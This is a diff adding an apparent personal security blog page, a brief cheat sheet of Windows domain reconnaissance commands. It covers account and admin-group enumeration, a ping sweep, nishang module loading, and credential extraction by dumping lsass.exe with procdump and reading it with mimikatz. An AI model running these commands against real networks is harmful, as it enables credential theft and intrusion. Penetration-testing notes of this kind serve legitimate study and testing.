@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网信息收集命令 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+1基本信息：
+whoami  /user   看sid （/all）看所以
+systeminfo     计算机信息
+net start          启动服务
+tasklist            进程列表
+schtasks   ..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网信息收集命令</h2>
+            <div class="post-date">2023-03-20</div>
+            
+            <div class="post-content" v-pre>
+              <!-- more -->
+<p>1基本信息：<br>
+whoami  /user   看sid （/all）看所以<br>
+systeminfo     计算机信息<br>
+net start          启动服务<br>
+tasklist            进程列表<br>
+schtasks          计划任务</p>
+<p>2网络信息：<br>
+判断域<br>
+ipconfig   /all    (看是否有dns域)<br>
+net view  /domain  判断存在域<br>
+net  time  /domain  判断主域<br>
+nslookpu   (主机全名)     查询DNS的记录,查询域名解析是否正常，域名，追踪来源ip地址<br>
+netstat    -ano     网络端口开放</p>
+<p>3.用户信息收集：<br>
+域系统常见用户身份</p>
+<p><img src="https://dydydy123.github.io/post-images/1679307598981.png" alt="" loading="lazy"><br>
+相关用户收集操作：<br>
+whoami   /all   用户权限<br>
+net   config    workstation     登陆信息<br>
+net   user   本地用户<br>
+net   localgroup   本地用户组<br>
+net   user   /domain    获取域用户信息<br>
+net  group   /domain    获取域用户组信息<br>
+wmic    useraccount    get   /all   涉及域用户详细信息<br>
+net   group   &quot;Domain   Admins&quot;   /domain     查询域管理员账户<br>
+net   group   &quot;Enterprise Admins&quot;  /domain    查询企业管理员用户组<br>
+net   group   &quot;Domain  Controllers&quot;   /domain   查询域控</p>
+<p>4凭据信息<br>
+收集密文，明文，口令等<br>
+用户HASH，明文获取 -mimikatz(win)  mimipenguit(linux)<br>
+计算机各种协议服务口令 lazagne(all)   xenarmor(win)<br>
+https://xenarmor.com/pdfpasswordremoverpro-free-full-version-software/</p>
+<p>procdump-minikatz<br>
+procdump.exe -accepteula -ma lsass.exe lsass.dmp</p>
+<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1679367647903.png" alt="" loading="lazy"></figure>
+<p>sekurlsa::minidump lsass.dmp</p>
+<p>sekurlsa::logonPassword full</p>
+<p>5.主机探测<br>
+for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</p>
+<p>nishang</p>
+<p>设置权限<br>
+Set-ExecutionPolicy RemoteSigned<br>
+加载模块<br>
+Import-Module .\nishang.psm1<br>
+获取模块<br>
+Get-Command -Module nishang<br>
+获取信息<br>
+Get-Information</p>
+<figure data-type="image" tabindex="2"><img src="https://dydydy123.github.io/post-images/1679307466255.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
